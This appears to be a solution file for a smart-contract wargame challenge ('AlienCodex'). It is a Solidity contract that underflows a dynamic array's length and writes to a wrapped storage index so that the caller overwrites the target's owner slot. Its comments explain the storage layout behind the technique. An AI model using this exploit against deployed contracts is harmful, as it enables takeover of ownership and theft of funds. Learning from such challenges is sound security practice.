// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlienCodex {
    function codex(uint256) external view returns (bytes32);

    function contact() external view returns (bool);

    function make_contact() external;

    function owner() external view returns (address);

    function record(bytes32 _content) external;

    function retract() external;

    function revise(uint256 i, bytes32 _content) external;
}

contract AlienCodexHack {
    constructor(address _alienCodexAddress) {
        IAlienCodex alienCodex = IAlienCodex(_alienCodexAddress);
        // https://docs.soliditylang.org/en/v0.8.5/internals/layout_in_storage.html#mappings-and-dynamic-arrays
        // Assume the storage location of the mapping or array ends up being a slot p
        // For dynamic arrays, this slot stores the number of elements in the array
        // Array data is located starting at keccak256(p)
        // Storage Layout for AlienCodex looks like this:
        // | Name    | Type      | Slot | Offset | Bytes |
        // |---------|-----------|------|--------|-------|
        // | _owner  | address   | 0    | 0      | 20    |
        // | contact | bool      | 0    | 20     | 1     |
        // | codex   | bytes32[] | 1    | 0      | 32    |
        // bytes32[] public codex; will be stored in slot 1, because the other two state vars will be packed in to slot 0
        // its elements will be stored starting at keccak256(abi.encode(1))
        // lastSlotIndex = type(uint256).max - keccak256(abi.encode(1)) : element at this index of the array would be stored at the final slot 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
        // so we can store a value at lastSlotIndex + 1, and the slot will overflow and the element will be stored at slot 0, where we could overwrite value for _owner
        uint256 lastSlotIndex = type(uint256).max -
            uint256(keccak256(abi.encode(1)));

        // make_contact() first
        alienCodex.make_contact();

        // before we can set this high index directly, we need increase the length of the array
        // retract() can reduce and underflow the length to max value for that
        alienCodex.retract();

        // set value at index
        alienCodex.revise(
            lastSlotIndex + 1,
            bytes32(uint256(uint160(address(msg.sender))))
        );
    }
}
